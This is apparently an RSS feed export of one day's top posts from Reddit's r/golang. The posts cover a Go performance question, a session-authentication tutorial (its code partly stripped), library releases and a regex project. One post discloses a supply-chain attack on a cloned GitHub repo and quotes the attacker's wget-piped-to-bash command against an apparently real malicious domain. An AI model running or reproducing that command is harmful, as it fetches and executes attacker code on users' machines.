{"id":"USgKoryE83j5SszZjyr68sh7DjLn4j6MWUagcNjQES7kQ1n2HXebXN4bJpBn8stf6LqSMrbny1unc4R1hi6qmf","title":"top scoring links : golang","displayTitle":"Reddit - Go","url":"https://www.reddit.com/r/golang/top/.rss?sort=top&t=day&limit=6","feedLink":"https://www.reddit.com/r/golang/top/?sort=top&t=day&limit=6","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":11,"items":[{"title":"tk9.0: v0.65.0 adds support for many more image formats","url":"https://www.reddit.com/r/golang/comments/1jcpp3d/tk90_v0650_adds_support_for_many_more_image/","date":1742143528,"author":"/u/0xjnml","guid":723,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/0xjnml\"> /u/0xjnml </a>","contentLength":29,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"MCP-server written in GO","url":"https://www.reddit.com/r/golang/comments/1jcp06c/mcpserver_written_in_go/","date":1742141699,"author":"/u/Temporary-Funny-1630","guid":760,"unread":true,"content":"<p>Hey everyone! I‚Äôd love to share my project with you:</p><p>üöÄ  ‚Äì a powerful  for AI agents!</p><p>-  for AI agent interactions - <strong>Supports multiple databases</strong>: PostgreSQL, MySQL, ClickHouse, Oracle, and more - <strong>Flexible modular architecture</strong> with plugins:</p><ul></ul><p>‚≠ê <strong>Give it a star and come contribute!</strong> üîó Repo: <a href=\"https://github.com/centralmind/gateway\">GitHub</a></p>","contentLength":300,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Go is DOOMed","url":"https://gitlab.com/cznic/doomgeneric/-/raw/master/sshot.png","date":1742139955,"author":"/u/0xjnml","guid":569,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jcochm/go_is_doomed/"},{"title":"How the hell do I make this Go program faster?","url":"https://www.reddit.com/r/golang/comments/1jcnqfi/how_the_hell_do_i_make_this_go_program_faster/","date":1742138311,"author":"/u/yourpwnguy","guid":568,"unread":true,"content":"<p>So, I‚Äôve been messing around with a Go program that: </p><ul><li>Writes the sorted output to a new file</li></ul><p>Seems so straightforward man :( Except it‚Äôs slow as hell. Here‚Äôs my code: </p><p>import ( \"fmt\" \"os\" \"strings\" \"slices\" )</p><p>func main() { if len(os.Args) &lt; 2 { fmt.Fprintln(os.Stderr, \"Usage:\", os.Args[0], \"&lt;file.txt&gt;\") return }</p><pre><code>// Read the input file f, err := os.ReadFile(os.Args[1]) if err != nil { fmt.Fprintln(os.Stderr, \"Error reading file:\", err) return } // Process the file lines := strings.Split(string(f), \"\\n\") uniqueMap := make(map[string]bool, len(lines)) </code></pre><p>var trimmed string for _, line := range lines { if trimmed = strings.TrimSpace(line); trimmed != \"\" { uniqueMap[trimmed] = true } }</p><pre><code>// Convert map keys to slice ss := make([]string, len(uniqueMap)) i := 0 for key := range uniqueMap { ss[i] = key i++ } slices.Sort(ss) // Write to output file o, err := os.Create(\"out.txt\") if err != nil { fmt.Fprintln(os.Stderr, \"Error creating file:\", err) return } defer o.Close() o.WriteString(strings.Join(ss, \"\\n\") + \"\\n\") </code></pre><p>I ran this on a big file, here's the link:</p><p>It takes  to run. That‚Äôs unacceptable. My CPU (R5 4600H 6C/12T, 24GB RAM) should not be struggling this hard.</p><p>I also profiled this code, Profiling Says: 1. Sorting (slices.Sort) is eating CPU. 2. GC is doing a world tour on my RAM. 3. map[string]bool is decent but might not be the best for this. I also tried the map[string] struct{} way but it's makes really minor difference.</p><p>The Goal: I want this thing to finish in 2-3 seconds. Maybe I‚Äôm dreaming, but whatever.</p><p>Any insights, alternative approaches, or even just small optimizations would be really helpful. Please if possible give the code too. Because I've literally tried so many variations but it still doesn't work like I want it to be. I also want to get better at writing efficient code, and squeeze out performance where possible.</p>","contentLength":1853,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes","url":"https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/","date":1742134690,"author":"/u/FlairPrime","guid":361,"unread":true,"content":"<p>Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!</p><p>This package acts like a : It is  and , providing everything you need in just  file with <strong>less than 200 lines of code</strong>.</p><ul><li>You want to  define your HTTP routes while using  the standard library.</li><li>You want to define  for your routes, groups, and subgroups while still relying on the standard library.</li><li>You  want to use  bloated with excessive functionalities that you might never use.</li></ul>","contentLength":501,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Session-Based Authentication in Go","url":"https://themsaid.com/session-authentication-go","date":1742114173,"author":"/u/themsaid","guid":724,"unread":true,"content":"<p>Earlier, we explored <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">session management in Go web applications</a>, followed by a deep dive into <a href=\"https://themsaid.com/csrf-protection-go-web-applications\" rel=\"nofollow\">CSRF protection</a>. Drawing from my decade of experience building web applications with Laravel, I've found that good old session-based authentication remains the most convenient and secure way to authenticate users. It strikes the perfect balance between simplicity and security, making it an approach I trust for building reliable web apps.</p><p>The idea behind session-based authentication is simple:</p><div><pre>Client                                    Server\n  |                                          |\n  |   User visits the web app              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server creates a session  sends   |\n  |     its  back                          |\n  | &lt;--------------------------------------- |\n  |                                          |\n  |   User submits login form              |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server verifies credentials and      |\n  |     stores the user identifier in the    |\n  |     session                              |\n  |                                          |\n  |   Server sends a success response      |\n  | &lt;----------------------------------------|\n  |                                          |\n  |   Client makes authenticated requests  |\n  |     (Cookie is automatically sent)       |\n  |----------------------------------------&gt; |\n  |                                          |\n  |   Server retrieves session data     |\n  |     extracts the user identifier         |\n  |                                          |\n  |   Server processes request          |\n  |     responds                             |\n  | &lt;----------------------------------------|</pre></div><p>When a session is first created, before the visitor submits the login form, it is known as an . At this stage, the session is not yet linked to a specific user, but it can still store temporary data that enhances the user experience.</p><p>For example, in an e-commerce application, an unauthenticated session can store items added to a shopping cart before the user logs in. In a blog or forum, an unauthenticated session might be used to save a visitor‚Äôs draft comments before they sign up. In general, unauthenticated sessions can be used to store flash messages, such as \"Item added to cart\" or \"Invalid login credentials\".</p><p>Once the login form is submitted and the user's identity is verified, storing the user identifier in the session converts it into an . Each time the client sends the cookie containing the session ID, the server uses it to identify the associated user and tailor the response accordingly.</p><p>The first step in implementing an authentication mechanism in our web application is to enable user registration. During this process, a user typically provides an email or username along with a password. The server then performs input sanitization and various validation checks to ensure the credentials are secure, properly formatted, and unique.</p><p>Once these checks are passed, the server securely stores the user‚Äôs credentials, often hashing the password using a strong algorithm like  or  before saving it to the database.</p><p>Since the scope of this articles covers only the authentication part, we'll skip input validation and sanitization and focus on hashing the password and storing it in a database:</p><div><pre> (\n\t\n)\n\n(\n    sql., \n    , \n    ,\n)  {\n\t, .(\n\t\t[](),\n\t\t.,\n\t)\n\t {\n\t\t\n\t}\n\n\t\n}</pre></div><p>The first step in our  method is to generate a secure hash for the provided password using the  package. This is a crucial security measure that helps protect user credentials in case the database is ever compromised. Hashing passwords ensures that even if an attacker, or a rogue employee, gains access to the database, they cannot easily retrieve the original password.</p><p>The  algorithm includes a cost factor, which controls how computationally expensive it is to hash a password and verify it later. A higher cost factor increases security by making brute-force attacks more difficult, but it also slows down the hashing process.</p><p>In our example, we use the default cost of 10, which strikes a good balance between security and performance. Popular frameworks, such as Laravel, set the default cost to 12 for added protection.</p><p>Next, we'll store the  along with the  in the database:</p><div><pre>,  bcrypt.()\n\n\n\n_, .(\n    ,\n    ,\n    ,\n)\n {\n    \n}</pre></div><p>With this in place, we now have a record in the database that allows us to verify user credentials when they attempt to log in.</p><p>For session-based authentication, the login process consists of two key steps:</p><ol><li>Verify that the user exists and the provided password matches the stored hash.</li><li>Store the authenticated user's information in the session to maintain their logged-in state.</li></ol><p>In the first step, we retrieve the user record from the database using the provided username and compare the given password with its hashed version. We do that in a  function:</p><div><pre>(\n\tsql.,\n\t,\n\t,\n)  {\n\t.(\n\t\t,\n\t\t,\n\t).()\n\t {\n\t\t.(, )\n\t}\n\n\t.(\n\t\t[](),\n\t\t[](),\n\t)\n\t {\n\t\t.(, )\n\t}\n\n    \n}</pre></div><p>The <code>bcrypt.CompareHashAndPassword</code> function allows us to verify whether a given plain-text password () matches a bcrypt-hashed password (). Since the bcrypt algorithm generates a unique salt for each hash, hashing the same password multiple times will always produce different results. This means we cannot simply hash the plain password and compare it directly to the stored hash in a database query. Instead,  extracts the salt from the stored hash and uses it to perform the comparison securely.</p><p>Next, for storing the user in the session, we will add a  function:</p><div><pre>(\n\thttp.,\n\t,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>The  function takes in the request, the session manager, and the username. It retrieves the session from the request using the  function (which we covered in a <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">previous article</a>), then migrates the session by deleting the existing session from the session store, assigning a new session ID, and generating a fresh CSRF token. Finally, it stores the username in the session to maintain the user's authenticated state.</p><p>Generating a new session ID when a user's privilege level changes is crucial for protecting against session fixation attacks. Without this step, an attacker could inject a known session ID into the user's session cookie before they authenticate, and then reuse this session ID after the user logs in. This would grant the attacker unauthorized access to the user's account.</p><p>The  method looks like this:</p><div><pre> () ()  {\n\t..(.)\n\t {\n\t\t\n\t}\n\n\t.()\n\t.(, ())\n\n\t\n}</pre></div><p>As you can see, the old session is deleted while the in-memory session instance gets a new session ID and .</p><p>Before sending the response, the session manager's middleware will include the new session ID in the response, and store the session as a new entry in our session store. For a deeper dive into how this works, refer to the <a href=\"https://themsaid.com/building-secure-session-manager-in-go\" rel=\"nofollow\">earlier article</a>.</p><p>To log a user out, we must migrate the session and remove the  from the session data:</p><div><pre>(\n\thttp.,\n\t,\n)  {\n\t()\n\n\t.()\n\t {\n\t\t.(, )\n\t}\n\n\t.(, )\n\n\t\n}</pre></div><p>By migrating the session, we ensure that the existing authenticated session is removed from the session store and a new one is created with the same session data. In the  function, we remove the  from the session to effectively convert it into an unauthenticated session. If any other critical information is stored in the session, it should also be removed. However, keeping non-critical session data, such as user preferences or timezone settings, can help provide a smooth user experience.</p><div><h2>Authentication Middleware</h2><a aria-label=\"Permalink: Authentication Middleware\" href=\"https://themsaid.com/session-authentication-go#authentication-middleware\"></a></div><p>Now, we‚Äôll add middleware to protect handlers from unauthenticated access. Within the middleware, we‚Äôll query the database to verify that the username stored in the session exists, ensuring the session belongs to a valid user:</p><div><pre>(sql.,  http.) http. {\n\t.(( http., http.) {\n\t\t()\n\n\t\t.().()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t.(\n\t\t\t,\n\t\t\t,\n\t\t).()\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\n\t\t {\n\t\t\t.(, , .)\n\t\t\t\n\t\t}\n\t})\n}</pre></div><p>As you might have guessed, this middleware must run <strong>after the session has been added to the request</strong>. In other words, the session manager's middleware must execute before the authentication middleware. Otherwise, the authentication middleware will panic when calling the  function, as it expects the session to be present in the request context.</p><div><pre>(http.)  {\n\t, .().({}).()\n\t {\n\t\t()\n\t}\n\n\t\n}</pre></div><p>In our middleware, we respond with a  error if authentication fails. Alternatively, you could choose to redirect the user to a  page, allowing them to enter their credentials and start a new authenticated session.</p><div><h2>Preventing Timing Attacks</h2><a aria-label=\"Permalink: Preventing Timing Attacks\" href=\"https://themsaid.com/session-authentication-go#preventing-timing-attacks\"></a></div><p>When handling login requests, it's best practice to ensure the authentication process takes a constant amount of time, regardless of whether the credentials are correct or not. This helps prevent timing attacks, which is a type of attacks where an attacker measures the time it takes for the server to respond and uses that information to infer sensitive data, such as valid usernames or partial password matches.</p><p>To protect against timing attacks, we'll start a timer at the beginning of our handler and invoke a  call to ensure the handler responds exactly after a certain duration:</p><div><pre>.(, ( http., http.) {\n    ..()\n\n    .(\n        ,\n        .(),\n        .(),\n    )\n     {\n        .(, , .())\n    }\n\n    .().()  {\n        .(.().())\n    }\n\n     {\n        .(, , .)\n        \n    }\n\n    .(, , , .)\n})</pre></div><p>Here, we set the handler's duration to 1 second, but you can adjust this based on your application's performance needs and the desired user experience. Next, we call the  function to check if the provided credentials are valid. If they are, we proceed with the  function.</p><p>Before returning either a success or failure response, we measure the elapsed time and call  if it‚Äôs less than 1 second, ensuring a consistent response time to mitigate timing attacks.</p><p>By storing the authenticated user identifier in the session, we can easily differentiate between authenticated and non-authenticated sessions. This allows us to retrieve user information at any point during the request lifecycle, ensuring that we can verify and tailor responses based on the user's authentication status.</p><p>The process is simple: we begin by extracting the session from the request, and then check the username session attribute:</p><div><pre>()\n\n.().()\n {\n    \n}  {\n    \n}</pre></div><p>If the username exists, it indicates that the session is authenticated, and we can proceed to access relevant user data. If not, we know that the session is not authenticated, and we can prompt the user to log in.</p>","contentLength":10531,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jch2ts/sessionbased_authentication_in_go/"},{"title":"I implemented my own regex engine in Go","url":"https://github.com/bogdan-deac/regex","date":1742069910,"author":"/u/Constant_Apple_577","guid":363,"unread":true,"content":"<p>Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.</p>","contentLength":203,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc455b/i_implemented_my_own_regex_engine_in_go/"},{"title":"My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape","url":"https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;utm_campaign=post&amp;utm_medium=web&amp;showWelcomeOnShare=true","date":1742061490,"author":"/u/theothertomelliott","guid":364,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/golang/comments/1jc0zby/my_6_months_with_the_goth_stack_building/"},{"title":"Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.","url":"https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/","date":1742058511,"author":"/u/_a8m_","guid":366,"unread":true,"content":"<p>Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.</p><pre><code>wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash &amp; </code></pre><p>I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project.</p><p> It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).</p>","contentLength":779,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is there a Nodejs library you wish existed for Golang?","url":"https://www.reddit.com/r/golang/comments/1jby40e/is_there_a_nodejs_library_you_wish_existed_for/","date":1742053901,"author":"/u/prisencotech","guid":362,"unread":true,"content":"<div><p>People often cite the availability of third party libraries for Node as the reason to prefer it over Golang. Has anyone run into a time when they had to use Node or made do without because a third party library didn't exist?</p></div>   submitted by   <a href=\"https://www.reddit.com/user/prisencotech\"> /u/prisencotech </a>","contentLength":259,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"New Viper release with major improvements","url":"https://www.reddit.com/r/golang/comments/1jbx8d6/new_viper_release_with_major_improvements/","date":1742051515,"author":"/u/sagikazarmark","guid":365,"unread":true,"content":"<p>It comes with a number of improvements:</p><ul><li>Heavily reduced number of third-party dependencies</li><li>New encoding layer for custom encoding formats</li><li>BREAKING: dropped HCL, INI and Java properties from the core (still possible to use through external libraries)</li><li>New file search API allows customizing how Viper looks for config files</li></ul><p>These features has been around for some time in alpha releases, though I haven't received a lot of feedback, so I'm posting here now in the hope that people using Viper will give some after upgrading.</p><p>I worked hard to minimize breaking changes, but it's possible some slipped in. If you find any, feel free to open an issue.</p>","contentLength":640,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null}],"tags":["dev","reddit","go"]}